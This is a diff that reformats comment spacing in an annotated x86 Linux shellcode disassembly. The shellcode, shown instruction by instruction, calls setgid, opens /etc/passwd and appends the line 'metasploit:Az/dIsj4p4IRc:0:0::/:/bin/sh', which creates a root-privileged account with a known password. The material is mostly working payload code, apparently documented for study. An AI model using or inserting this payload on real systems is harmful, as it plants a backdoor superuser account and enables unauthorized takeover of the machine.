@@ -17,32 +17,32 @@
 /*
    0xbfffeede:	xor    ecx,ecx	
    0xbfffeee0:	mov    ebx,ecx
-   0xbfffeee2:	push   0x46	   ;preparing setgid syscall {setgid (%ebx)}
+   0xbfffeee2:	push   0x46 ;preparing setgid syscall {setgid (%ebx)}
    0xbfffeee4:	pop    eax
-   0xbfffeee5:	int    0x80	   ;setgid to the process will run with group id of the file
-   0xbfffeee7:	push   0x5		;preparing open syscall	{open (%ebx , %ecx , %edx )}
+   0xbfffeee5:	int    0x80	;setgid to the process will run with group id of the file
+   0xbfffeee7:	push   0x5 ;preparing open syscall	{open (%ebx , %ecx , %edx )}
    0xbfffeee9:	pop    eax
    0xbfffeeea:	xor    ecx,ecx
-   0xbfffeeec:	push   ecx		   ;pushing null to /etc/passwd
-   0xbfffeeed:	push   0x64777373	;pushing /etc/passwd
+   0xbfffeeec:	push   ecx ;pushing null to /etc/passwd
+   0xbfffeeed:	push   0x64777373 ;pushing /etc/passwd
    0xbfffeef2:	push   0x61702f2f
    0xbfffeef7:	push   0x6374652f
    0xbfffeefc:	mov    ebx,esp
-   0xbfffeefe:	inc    ecx	      ;increments ecx [0] by one for the next instruction to make it 0x401
-   0xbfffeeff:	mov    ch,0x4	   ;open syscall flags
-   0xbfffef01:	int    0x80	      ;opens /etc/passwd
+   0xbfffeefe:	inc    ecx ;increments ecx [0] by one for the next instruction to make it 0x401
+   0xbfffeeff:	mov    ch,0x4 ;open syscall flags
+   0xbfffef01:	int    0x80	;opens /etc/passwd
    0xbfffef03:	xchg   ebx,eax
-   0xbfffef04:	call   0xbfffef31             ;using call pop instead of our famous jmp-call-pop to save something in top of the stack
+   0xbfffef04:	call   0xbfffef31 ;using call pop instead of our famous jmp-call-pop to save something in top of the stack
    0xbfffef09:	ins    DWORD PTR es:[edi],dx ;represent [metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh] string
 
-   0xbfffef31:	pop    ecx		                ;get "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" from stack and stores it in ecx
+   0xbfffef31:	pop    ecx ;get "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" from stack and stores it in ecx
    0xbfffef32:	mov    edx,DWORD PTR [ecx-0x4] ;get length of "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" and stores it in edx which is [40]
-   0xbfffef35:	push   0x4		                ;preparing write syscall {write (%ebx , %ecx , %edx )}
+   0xbfffef35:	push   0x4 ;preparing write syscall {write (%ebx , %ecx , %edx )}
    0xbfffef37:	pop    eax
-   0xbfffef38:	int    0x80 		             ;writes "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" into opened file /etc/passwd with length of [40]
-   0xbfffef3a:	push   0x1	                   ;preparing exit syscall  {_exit (%ebx)}
+   0xbfffef38:	int    0x80 ;writes "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" into opened file /etc/passwd with length of [40]
+   0xbfffef3a:	push   0x1 ;preparing exit syscall  {_exit (%ebx)}
    0xbfffef3c:	pop    eax
-   0xbfffef3d:	int    0x80	                   ;exits gracefuly
+   0xbfffef3d:	int    0x80 ;exits gracefuly
 
 
 */
